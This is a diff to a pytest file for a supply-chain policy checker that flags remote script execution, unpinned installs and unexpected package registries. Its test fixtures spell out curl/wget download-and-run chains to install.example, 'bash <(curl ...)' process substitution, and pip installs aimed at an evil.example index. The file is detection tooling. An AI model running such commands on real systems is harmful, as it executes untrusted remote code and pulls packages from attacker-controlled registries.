@@ -28,14 +28,38 @@ from awf.service.supply_chain_policy import (
     SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL,
     SupplyChainPolicyRefreshError,
     SupplyChainPolicyRefreshService,
+    _combined_env_assignments,
+    _command_from_line,
+    _command_lines,
+    _command_token_segments,
+    _command_with_shell_payloads,
+    _export_env_assignments,
+    _has_chained_remote_script_execution,
+    _has_process_substitution_remote_script_execution,
     _host_from_url,
+    _interpreter_script_target,
+    _is_known_evidence_command,
+    _is_pinned_node_spec,
+    _is_pinned_or_local_spec,
+    _is_pinned_pip_spec,
     _is_remote_fetch,
     _isoformat,
     _nested_dict,
     _node_package_command,
+    _node_package_version,
+    _node_pin_value_is_pinned,
+    _node_pin_value_is_semver_range,
     _normalize_path,
     _package_command,
+    _pip_env_registry_hosts,
     _pipe_target_is_interpreter,
+    _process_substitution_args,
+    _registry_hosts,
+    _remote_fetch_artifact_names,
+    _remote_fetch_output_targets,
+    _shell_command_payload,
+    _shell_tokens,
+    _value_flags,
     evaluate_supply_chain_policy,
     supply_chain_policy_for_workspace,
 )
@@ -425,8 +449,7 @@ def test_additional_package_manager_forms_are_classified_without_noise() -> None
 def test_versioned_python_pip_install_is_classified() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
-            "python3.12 -m pip install requests "
-            "--index-url https://evil.example/simple"
+            "python3.12 -m pip install requests --index-url https://evil.example/simple"
         ),
         changed_paths=(),
         owned_paths=(),
@@ -556,8 +579,7 @@ def test_pip_remote_vcs_url_with_revision_is_treated_as_pinned() -> None:
 def test_credentialed_registry_url_still_reports_unexpected_host() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
-            "$ pip install requests==2.32.3 "
-            "--index-url https://token@evil.example/simple\n"
+            "$ pip install requests==2.32.3 --index-url https://token@evil.example/simple\n"
         ),
         changed_paths=(),
         owned_paths=(),
@@ -597,8 +619,7 @@ def test_pip_inline_env_registry_urls_report_unexpected_hosts() -> None:
 def test_exported_pip_registry_url_reports_unexpected_host() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
-            "$ export PIP_INDEX_URL=https://evil.example/simple; "
-            "pip install requests==2.32.3\n"
+            "$ export PIP_INDEX_URL=https://evil.example/simple; pip install requests==2.32.3\n"
         ),
         changed_paths=(),
         owned_paths=(),
@@ -633,7 +654,9 @@ def test_command_parser_avoids_prose_healthcheck_and_markdown_false_positives() 
 
 
 @pytest.mark.unit
-def test_supply_chain_policy_for_workspace_defaults_to_warn_and_ignores_malformed_snapshot() -> None:
+def test_supply_chain_policy_for_workspace_defaults_to_warn_and_ignores_malformed_snapshot() -> (
+    None
+):
     default_policy = supply_chain_policy_for_workspace(Workspace(resolved_profile=None))
     snapshot_policy = supply_chain_policy_for_workspace(
         Workspace(
@@ -663,9 +686,7 @@ def test_supply_chain_policy_for_workspace_defaults_to_warn_and_ignores_malforme
 
     assert default_policy.remote_script_execution.mode == "warn"
     assert snapshot_policy.remote_script_execution.mode == "block"
-    assert snapshot_policy.unexpected_registry_hosts.allowed_hosts == [
-        "registry.npmjs.org"
-    ]
+    assert snapshot_policy.unexpected_registry_hosts.allowed_hosts == ["registry.npmjs.org"]
     assert malformed_policy.remote_script_execution.mode == "warn"
     assert invalid_policy.remote_script_execution.mode == "warn"
 
@@ -675,9 +696,7 @@ def test_private_normalizers_cover_empty_and_bad_inputs_without_recording_secret
     assert _host_from_url("https://token@pypi.org/simple") == "pypi.org"
     assert _is_remote_fetch([]) is False
     assert _pipe_target_is_interpreter([]) is False
-    assert _nested_dict({"security": {"supply_chain": {}}}, "security") == {
-        "supply_chain": {}
-    }
+    assert _nested_dict({"security": {"supply_chain": {}}}, "security") == {"supply_chain": {}}
     assert _nested_dict({"security": "bad"}, "security", "supply_chain") is None
     assert _isoformat(datetime(2026, 5, 3, 12, 0)) == "2026-05-03T12:00:00+00:00"
     assert _isoformat(None) is None
@@ -685,6 +704,191 @@ def test_private_normalizers_cover_empty_and_bad_inputs_without_recording_secret
     assert _normalize_path("../uv.lock") == "uv.lock"
     assert _normalize_path("src/../uv.lock") == "uv.lock"
     assert _package_command("", []) is None
+
+
+@pytest.mark.unit
+def test_remote_fetch_output_targets_and_chained_execution_variants() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ curl -o setup.sh https://install.example/setup.sh && sh setup.sh\n"
+            "$ curl --output=bootstrap https://install.example/bootstrap && bash bootstrap\n"
+            "$ curl -fsSLoattached.sh https://install.example/attached.sh; sh attached.sh\n"
+            "$ wget -O installer https://install.example/installer && bash installer\n"
+            "$ wget --output-document=bootstrap.sh https://install.example/bootstrap.sh "
+            "&& sh bootstrap.sh\n"
+            "$ wget -qOattached-wget.sh https://install.example/wget.sh; sh attached-wget.sh\n"
+            "$ curl -o - https://install.example/stdout.sh && bash stdout.sh\n"
+            "$ curl https://install.example/no-target.sh && bash other.sh\n"
+            "$ bash scripts/local.sh\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [finding.reason_code for finding in findings] == [
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
+    ]
+    assert _remote_fetch_artifact_names(()) == set()
+    assert _remote_fetch_output_targets(()) == []
+    assert _remote_fetch_output_targets(
+        _shell_tokens("curl -o setup.sh https://install.example/setup.sh")
+    ) == ["setup.sh"]
+    assert _remote_fetch_output_targets(
+        _shell_tokens("curl -fsSo setup.sh https://install.example/setup.sh")
+    ) == ["setup.sh"]
+    assert _remote_fetch_output_targets(
+        _shell_tokens("wget -qOattached.sh https://install.example/setup.sh")
+    ) == ["attached.sh"]
+    assert _remote_fetch_output_targets(
+        _shell_tokens("wget -qO setup.sh https://install.example/setup.sh")
+    ) == ["setup.sh"]
+    assert (
+        _remote_fetch_output_targets(_shell_tokens("wget -q https://install.example/setup.sh"))
+        == []
+    )
+    assert (
+        _remote_fetch_artifact_names(_shell_tokens("curl -o / https://install.example/")) == set()
+    )
+    assert not _has_chained_remote_script_execution(
+        _shell_tokens("curl https://install.example/setup.sh && bash -e")
+    )
+
+
+@pytest.mark.unit
+def test_process_substitution_and_interpreter_target_edge_cases() -> None:
+    assert _has_process_substitution_remote_script_execution(
+        _shell_tokens("bash <(curl https://install.example/setup.sh)")
+    )
+    assert _has_process_substitution_remote_script_execution(
+        ["bash", "<(", "curl", "https://install.example/setup.sh", ")"]
+    )
+    assert not _has_process_substitution_remote_script_execution(["bash", "<("])
+    assert not _has_process_substitution_remote_script_execution(
+        ["bash", "<(", "cat", "https://install.example/setup.sh", ")"]
+    )
+    assert list(
+        _process_substitution_args(["curl", "https://install.example/setup.sh)", "sh"])
+    ) == [
+        "curl",
+        "https://install.example/setup.sh)",
+    ]
+    assert list(_process_substitution_args(["curl", "https://install.example/setup.sh"])) == [
+        "curl",
+        "https://install.example/setup.sh",
+    ]
+    assert _interpreter_script_target(["bash", "-e", "setup.sh"]) == "setup.sh"
+    assert _interpreter_script_target(["bash", "-e"]) is None
+    assert _interpreter_script_target(["cat", "setup.sh"]) is None
+
+
+@pytest.mark.unit
+def test_shell_payload_extraction_handles_options_recursion_and_bad_input() -> None:
+    command = "sh -c 'fish --command=\"pip install requests\"'"
+
+    assert _command_with_shell_payloads(command) == [
+        command,
+        'fish --command="pip install requests"',
+        "pip install requests",
+    ]
+    assert _command_with_shell_payloads("npm install left-pad", depth=4) == ["npm install left-pad"]
+    assert _shell_command_payload(_shell_tokens("bash -o pipefail -c 'npm install left-pad'")) == (
+        "npm install left-pad"
+    )
+    assert _shell_command_payload(_shell_tokens("bash +o pipefail -c 'pip install requests'")) == (
+        "pip install requests"
+    )
+    assert _shell_command_payload(_shell_tokens("bash --noprofile -c 'npm install left-pad'")) == (
+        "npm install left-pad"
+    )
+    assert _shell_command_payload(_shell_tokens("bash +x -c 'npm install left-pad'")) == (
+        "npm install left-pad"
+    )
+    assert _shell_command_payload(_shell_tokens("bash -x script.sh")) is None
+    assert _shell_command_payload(_shell_tokens("bash script.sh")) is None
+    assert _shell_tokens("'unterminated") == []
+    assert _command_from_line("") is None
+    assert _command_from_line("'unterminated") is None
+    assert _command_from_line("not a command") is None
+    assert _command_from_line("FOO=bar") is None
+    assert _command_lines(("notes only", "$ npm ci")) == ["npm ci"]
+    assert _command_token_segments(
+        [";", "npm", "ci", "&&", "pip", "install", "requests", "||"],
+        frozenset({";", "&&", "||"}),
+    ) == [["npm", "ci"], ["pip", "install", "requests"]]
+    assert _is_known_evidence_command("python3.12")
+
+
+@pytest.mark.unit
+def test_registry_env_and_wrapper_option_parsing_edges() -> None:
+    assert _export_env_assignments(()) == ()
+    assert _export_env_assignments(["export", "PIP_INDEX_URL=https://evil.example/simple"]) == (
+        "PIP_INDEX_URL=https://evil.example/simple",
+    )
+    assert _combined_env_assignments(
+        ("PIP_INDEX_URL=https://old.example/simple", "NOT_A_REGISTRY"),
+        ("PIP_INDEX_URL=https://new.example/simple",),
+    ) == ("PIP_INDEX_URL=https://new.example/simple",)
+    assert _pip_env_registry_hosts(
+        (
+            "NOT_A_REGISTRY=https://ignored.example/simple",
+            "PIP_INDEX_URL=https://one.example/simple https://two.example/simple",
+            "PIP_EXTRA_INDEX_URL=https://one.example/simple",
+        )
+    ) == ["one.example", "two.example"]
+    assert _registry_hosts(
+        ("--index-url", "https://three.example/simple", "-ihttps://four.example/simple"),
+        manager="pip",
+        env_assignments=("PIP_INDEX_URL=https://one.example/simple",),
+    ) == ["one.example", "three.example", "four.example"]
+    assert _registry_hosts(
+        (
+            "--index-url",
+            "https://one.example/simple",
+            "--extra-index-url",
+            "https://one.example/simple",
+        ),
+        manager="pip",
+        env_assignments=("PIP_INDEX_URL=https://one.example/simple",),
+    ) == ["one.example"]
+    assert _registry_hosts(
+        ("--registry=https://registry.example/npm",),
+        manager="npm",
+    ) == ["registry.example"]
+    assert _host_from_url("://") is None
+    assert "--python" in _value_flags("pip")
+    assert "--workspace" in _value_flags("npm")
+    assert _package_command("", _shell_tokens("sudo -u root -- npm install left-pad")) is not None
+    assert (
+        _package_command("", _shell_tokens("sudo --user=root -- npm install left-pad")) is not None
+    )
+    assert _package_command("", _shell_tokens("env -S 'npm install left-pad'")) is None
+    assert _package_command("", _shell_tokens("command -- npm install left-pad")) is not None
+
+
+@pytest.mark.unit
+def test_pin_classifiers_cover_local_alias_scoped_and_semver_edges() -> None:
+    assert _is_pinned_or_local_spec("npm", "workspace:*")
+    assert _is_pinned_or_local_spec("npm", "link:../pkg")
+    assert _is_pinned_or_local_spec("pip", "./local")
+    assert _is_pinned_pip_spec("demo===1.0.0")
+    assert _is_pinned_pip_spec("--requirement=requirements.txt")
+    assert _is_pinned_pip_spec("git+file:///tmp/pkg")
+    assert not _is_pinned_pip_spec("git+https://github.com/example/pkg")
+    assert not _is_pinned_node_spec("alias@npm:@scope/pkg@1.2.3")
+    assert not _is_pinned_node_spec("alias@npm:@scope/pkg")
+    assert _node_package_version("@scope/pkg@1.2.3") == "1.2.3"
+    assert _node_package_version("@scope/pkg") is None
+    assert _node_pin_value_is_pinned("semver:1.2.3")
+    assert not _node_pin_value_is_pinned("semver:^1.2.3")
+    assert _node_pin_value_is_semver_range("1.2")
+    assert _node_pin_value_is_semver_range("1.x")
 
 
 @pytest.mark.unit
@@ -810,9 +1014,7 @@ async def test_refresh_workspace_without_candidate_records_workspace_level_findi
         await session.commit()
 
     async with factory() as session:
-        findings = await PolicyFindingRepository(session).list_active_for_workspace(
-            workspace_id
-        )
+        findings = await PolicyFindingRepository(session).list_active_for_workspace(workspace_id)
         events = await WorkspaceEventRepository(session).list(
             workspace_id=workspace_id,
             event_type="workspace.policy_finding",
